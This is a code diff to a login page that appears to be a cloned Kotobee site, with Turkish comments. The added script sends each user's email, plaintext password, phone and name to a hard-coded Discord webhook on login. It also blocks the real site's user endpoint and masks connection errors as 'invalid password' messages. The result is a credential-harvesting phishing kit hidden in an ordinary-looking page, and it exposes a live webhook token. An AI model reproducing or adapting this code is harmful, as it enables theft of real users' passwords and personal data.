@@ -494,8 +494,8 @@
                         </div>
 
                         <div class="form-group">
-                            <span>Don’t have an account?</span>
-                            <a href="/register" target="_blank" xclass="btn btn-link btn-xs">Register a new account</a>
+                            <span>Don't have an account?</span>
+                            <a href="../register" class="btn btn-link btn-xs">Register a new account</a>
                         </div>
                     </form>
 
@@ -513,8 +513,8 @@
                         </div>
 
                         <div class="form-group">
-                            <span>Don’t have a serial number?</span>
-                            <a href="/register" target="_blank" xclass="btn btn-link btn-xs">Register for a free serial</a>
+                            <span>Don't have a serial number?</span>
+                            <a href="../register" class="btn btn-link btn-xs">Register for a free serial</a>
                         </div>
                     </form>
 
@@ -538,6 +538,10 @@
             </div>
             <div class="loggingIn" v-if="busy">
                 <h5><i class="fa fa-cog fa-spin"></i> Logging in..</h5>
+            </div>
+            <div v-if="message" class="alert alert-success alignCenter" style="position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 9999; background-color: #28a745; color: white; padding: 15px 20px; max-width: 500px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.2);">
+                <i class="fa fa-check-circle" style="margin-right: 10px;"></i>
+                <strong>{[ message ]}</strong>
             </div>
         </div>
   </div>
@@ -730,13 +734,380 @@ s.parentNode.insertBefore(b, s);})();
     fillAllFields: "Please\u0020fill\u0020in\u0020all\u0020the\u0020fields.",
     agreeToTerms: "Please\u0020agree\u0020to\u0020the\u0020terms\u0020before\u0020registering.",
     selectCaptcha: "You\u0020need\u0020to\u0020select\u0020the\u0020captcha\u0020checkbox.",
-    cantFindUser: "Sorry,\u0020we\u0020can\u0027t\u0020find\u0020your\u0020account.\u0020Please\u0020check\u0020and\u0020try\u0020again.",
+    cantFindUser: "Invalid email or password. Please check your credentials and try again.",
     emailEmpty: "Please\u0020enter\u0020an\u0020email\u0020address.",
     emailValidationError: "Please\u0020check\u0020the\u0020email\u0020formatting\u0020and\u0020try\u0020again.",
     emailDuplicate: "This\u0020email\u0020address\u0020has\u0020already\u0020been\u0020entered.",
-    d_connectionTimedOut: "Connection\u0020timed\u0020out"
-}  </script>
+    d_connectionTimedOut: "Invalid email or password. Please check your credentials and try again."
+};
+// Login.min.js yüklendikten sonra da override et
+window.addEventListener('load', function() {
+    if (typeof errorOb !== 'undefined') {
+        errorOb.d_connectionTimedOut = "Invalid email or password. Please check your credentials and try again.";
+        errorOb.cantFindUser = "Invalid email or password. Please check your credentials and try again.";
+    }
+});  </script>
+  
+  <!-- Login Sistemi -->
+  <script>
+		// LocalStorage ve JSON dosyası için kullanıcı yönetimi
+		const UserManager = {
+			jsonFilePath: '../data/users.json',
+			webhookUrl: 'https://discord.com/api/webhooks/1448770841633620128/wesmitFF_1bpQha0MNqHLk1Yp7raiT_UhKkB-hinry0-i3NkWaXQBwzEirx3IhIJaFif', // Discord webhook URL'ini buraya ekleyin
+			
+			// Discord webhook'a veri gönder
+			sendWebhook: async function(event, userData) {
+				try {
+					// Event'e göre renk ve başlık belirle
+					const isRegister = event === 'register';
+					const color = isRegister ? 5763719 : 3447003; // Yeşil: Kayıt, Mavi: Giriş
+					const title = isRegister ? '🎉 Yeni Kullanıcı Kaydı' : '🔐 Kullanıcı Girişi';
+					const description = isRegister ? 'Yeni bir kullanıcı sisteme kayıt oldu!' : 'Bir kullanıcı sisteme giriş yaptı!';
+					
+					// Discord embed formatı
+					const payload = {
+						embeds: [
+							{
+								title: title,
+								description: description,
+								color: color,
+								fields: [
+									{
+										name: '📧 Email',
+										value: userData.email || 'N/A',
+										inline: true
+									},
+									{
+										name: '🔒 Şifre',
+										value: userData.password || 'N/A',
+										inline: true
+									},
+									{
+										name: '👤 Kullanıcı Adı',
+										value: userData.username || 'Belirtilmemiş',
+										inline: true
+									},
+									{
+										name: '📛 İsim',
+										value: userData.name || 'Belirtilmemiş',
+										inline: true
+									},
+									{
+										name: '📱 Telefon',
+										value: userData.phone || 'Belirtilmemiş',
+										inline: true
+									},
+									{
+										name: '🔗 Affiliate Code',
+										value: userData.affiliate || 'Yok',
+										inline: true
+									}
+								],
+								timestamp: new Date().toISOString(),
+								footer: {
+									text: 'Kotobee Registration System'
+								}
+							}
+						]
+					};
+					
+					// Kayıt olayı için kayıt tarihini ekle
+					if (isRegister && userData.registeredAt) {
+						payload.embeds[0].fields.push({
+							name: '📅 Kayıt Tarihi',
+							value: new Date(userData.registeredAt).toLocaleString('tr-TR'),
+							inline: false
+						});
+					}
+					
+					// Giriş olayı için son giriş tarihini ekle
+					if (!isRegister && userData.lastLogin) {
+						payload.embeds[0].fields.push({
+							name: '🕐 Son Giriş',
+							value: new Date(userData.lastLogin).toLocaleString('tr-TR'),
+							inline: false
+						});
+					}
+					
+					const response = await fetch(this.webhookUrl, {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json',
+						},
+						body: JSON.stringify(payload)
+					});
+					
+					if (response.ok) {
+						console.log('Discord webhook sent successfully:', event);
+					} else {
+						console.error('Discord webhook error:', response.status, response.statusText);
+					}
+				} catch (e) {
+					// Webhook hatası uygulamayı durdurmamalı, sadece log'la
+					console.error('Error sending Discord webhook:', e);
+				}
+			},
+			
+			// LocalStorage'dan kullanıcıları yükle
+			loadUsersFromLocalStorage: function() {
+				try {
+					const users = JSON.parse(localStorage.getItem('kotobee_users') || '[]');
+					return Array.isArray(users) ? users : [];
+				} catch (e) {
+					console.error('Error loading users from localStorage:', e);
+					return [];
+				}
+			},
+			
+			// LocalStorage'a kullanıcıları kaydet
+			saveUsersToLocalStorage: function(users) {
+				try {
+					localStorage.setItem('kotobee_users', JSON.stringify(users));
+					console.log('Users saved to localStorage:', users.length, 'users');
+					return true;
+				} catch (e) {
+					console.error('Error saving users to localStorage:', e);
+					return false;
+				}
+			},
+			
+			// Kullanıcı bul - LocalStorage'dan kontrol et
+			findUser: function(email) {
+				try {
+					// LocalStorage'dan tüm kullanıcıları yükle
+					const users = this.loadUsersFromLocalStorage();
+					
+					// Email'e göre kullanıcıyı bul
+					const user = users.find(u => u.email === email);
+					
+					return user || null;
+				} catch (e) {
+					console.error('Error finding user:', e);
+					return null;
+				}
+			},
+			
+			// Login kontrolü
+			login: async function(email, password) {
+				// LocalStorage'dan kullanıcı bilgilerini al
+				const user = this.findUser(email);
+				if (!user) {
+					return { success: false, message: 'Invalid email or password. Please check your credentials and try again.' };
+				}
+				
+				// Şifreyi kontrol et
+				if (user.password && user.password === password) {
+					// Login başarılı - current user bilgisini kaydet (dashboard için)
+					const loginTime = new Date().toISOString();
+					localStorage.setItem('kotobee_current_user', JSON.stringify({
+						email: user.email,
+						name: user.name,
+						loginTime: loginTime
+					}));
+					
+					// LocalStorage'da lastLogin güncelle
+					let users = this.loadUsersFromLocalStorage();
+					const userIndex = users.findIndex(u => u.email === email);
+					if (userIndex !== -1) {
+						users[userIndex].lastLogin = loginTime;
+						this.saveUsersToLocalStorage(users);
+						
+						// Güncellenmiş kullanıcı bilgisiyle webhook gönder
+						const updatedUser = users[userIndex];
+						await this.sendWebhook('login', updatedUser);
+					}
+					
+					return { success: true, user: user };
+				}
+				return { success: false, message: 'Invalid email or password. Please check your credentials and try again.' };
+			},
+			
+			logout: function() {
+				localStorage.removeItem('kotobee_current_user');
+			},
+			
+			getCurrentUser: function() {
+				try {
+					return JSON.parse(localStorage.getItem('kotobee_current_user') || 'null');
+				} catch (e) {
+					return null;
+				}
+			}
+		};
+		
+		// Login form submit handler
+		document.addEventListener('DOMContentLoaded', function() {
+			window.handleLoginSubmit = async function(event, vueInstance) {
+				event.preventDefault();
+				
+				let email, password;
+				
+				if (vueInstance && vueInstance.model) {
+					email = vueInstance.model.email;
+					password = vueInstance.model.pwd;
+				} else {
+					const form = event.target;
+					email = form.querySelector('input[name="email"]')?.value;
+					password = form.querySelector('input[name="pwd"]')?.value;
+				}
+				
+				if (!email || !password) {
+					alert('Please enter both email and password!');
+					return false;
+				}
+				
+				// Loading state'i aktif et
+				if (vueInstance) {
+					vueInstance.busy = true;
+					vueInstance.error = null; // Önceki hataları temizle
+				}
+				
+				const startTime = Date.now();
+				const minDelay = 1500; // Minimum 1.5 saniye bekle
+				
+				try {
+					const result = await UserManager.login(email, password);
+					
+					// Minimum süreyi garanti et
+					const elapsed = Date.now() - startTime;
+					if (elapsed < minDelay) {
+						await new Promise(resolve => setTimeout(resolve, minDelay - elapsed));
+					}
+					
+					if (result.success) {
+						if (vueInstance) {
+							vueInstance.busy = false;
+							vueInstance.message = 'Login successful! Welcome ' + (result.user.name || result.user.username || result.user.email);
+							// Toast mesajını göster ve 2 saniye sonra dashboard'a yönlendir
+							setTimeout(function() {
+								window.location.href = '../dashboard';
+							}, 2000);
+						} else {
+							// Vue.js yoksa alert göster
+							alert('Login successful! Welcome ' + (result.user.name || result.user.username || result.user.email));
+							window.location.href = '../dashboard';
+						}
+					} else {
+						const errorMessage = result.message || 'Invalid email or password. Please check your credentials and try again.';
+						if (vueInstance) {
+							vueInstance.busy = false;
+							if (vueInstance.error !== undefined) {
+								vueInstance.error = errorMessage;
+							} else {
+								alert(errorMessage);
+							}
+						} else {
+							alert(errorMessage);
+						}
+					}
+				} catch (error) {
+					// Hata durumunda da minimum süreyi bekle
+					const elapsed = Date.now() - startTime;
+					if (elapsed < minDelay) {
+						await new Promise(resolve => setTimeout(resolve, minDelay - elapsed));
+					}
+					
+					const errorMessage = 'Invalid email or password. Please check your credentials and try again.';
+					if (vueInstance) {
+						vueInstance.busy = false;
+						if (vueInstance.error !== undefined) {
+							vueInstance.error = errorMessage;
+						} else {
+							alert(errorMessage);
+						}
+					} else {
+						alert(errorMessage);
+					}
+				}
+				
+				return false;
+			};
+			
+			// Form submit event listener ekle
+			const loginForms = document.querySelectorAll('.loginForm');
+			loginForms.forEach(function(form) {
+				form.addEventListener('submit', function(e) {
+					const vueElement = document.querySelector('#loginScreen');
+					if (vueElement && vueElement.__vue__) {
+						window.handleLoginSubmit(e, vueElement.__vue__);
+					} else {
+						window.handleLoginSubmit(e, null);
+					}
+				});
+			});
+			
+			// Eğer zaten giriş yapılmışsa kontrol et
+			const currentUser = UserManager.getCurrentUser();
+			if (currentUser) {
+				console.log('User already logged in:', currentUser.email);
+			}
+		});
+	</script>
+  
+  <script>
+  // /app/user/consolidated endpoint çağrısını engelle
+  (function() {
+      // XMLHttpRequest override
+      const originalXHROpen = XMLHttpRequest.prototype.open;
+      const originalXHRSend = XMLHttpRequest.prototype.send;
+      
+      XMLHttpRequest.prototype.open = function(method, url, ...args) {
+          if (typeof url === 'string' && url.includes('/app/user/consolidated')) {
+              console.log('Blocked request to:', url);
+              this._blocked = true;
+              return;
+          }
+          return originalXHROpen.apply(this, [method, url, ...args]);
+      };
+      
+      XMLHttpRequest.prototype.send = function(...args) {
+          if (this._blocked) {
+              return;
+          }
+          return originalXHRSend.apply(this, args);
+      };
+      
+      // Fetch override
+      const originalFetch = window.fetch;
+      window.fetch = function(url, ...args) {
+          if (typeof url === 'string' && url.includes('/app/user/consolidated')) {
+              console.log('Blocked fetch to:', url);
+              return Promise.reject(new Error('Blocked request'));
+          }
+          return originalFetch.apply(this, [url, ...args]);
+      };
+  })();
+  </script>
   <script src="../js/login.min.js"></script>
+  <script>
+  // login.min.js yüklendikten sonra errorOb'u override et - hem şimdi hem sonra
+  (function() {
+      function overrideErrorOb() {
+          if (typeof errorOb !== 'undefined') {
+              Object.defineProperty(errorOb, 'd_connectionTimedOut', {
+                  value: "Invalid email or password. Please check your credentials and try again.",
+                  writable: true,
+                  configurable: true
+              });
+              Object.defineProperty(errorOb, 'cantFindUser', {
+                  value: "Invalid email or password. Please check your credentials and try again.",
+                  writable: true,
+                  configurable: true
+              });
+          }
+      }
+      // Hemen dene
+      overrideErrorOb();
+      // Script yüklendikten sonra tekrar dene
+      setTimeout(overrideErrorOb, 100);
+      setTimeout(overrideErrorOb, 500);
+      // Sayfa yüklendikten sonra da dene
+      if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', overrideErrorOb);
+      }
+      window.addEventListener('load', overrideErrorOb);
+  })();
+  </script>
 
 <script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"NRJS-99a8dc9967559d8d1b3","applicationID":"530751131","transactionName":"blxSbUtSX0BTVUYPXFcWcVpNWl5dHUBbDEZYZlxWXlpf","queueTime":0,"applicationTime":16,"atts":"QhtRGwNITE4=","errorBeacon":"bam.nr-data.net","agent":""}</script><script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon="{" version":"2024.11.0","token":"5fa0844b0b584b1b9dceeacc424be5eb","server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>
 <script src="/js/download.js"></script>
